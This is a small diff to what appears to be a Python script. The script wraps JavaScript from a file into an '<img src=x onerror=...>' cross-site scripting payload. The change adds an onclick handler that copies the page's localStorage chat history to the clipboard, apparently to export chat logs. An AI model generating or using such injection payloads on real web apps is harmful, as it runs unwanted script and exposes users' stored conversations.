@@ -9,4 +9,4 @@ with open("test.js", "rb") as f2:
 
 js_content = js_content.replace("\n",";").replace("\"","'")
 
-print("<img src=x onerror=\""+js_content+"\">")
+print("<img src=x onerror=\""+js_content+"\" alt='click pic to export Json Chat history' onclick='navigator.clipboard.writeText(localStorage.chatStorage)'>")
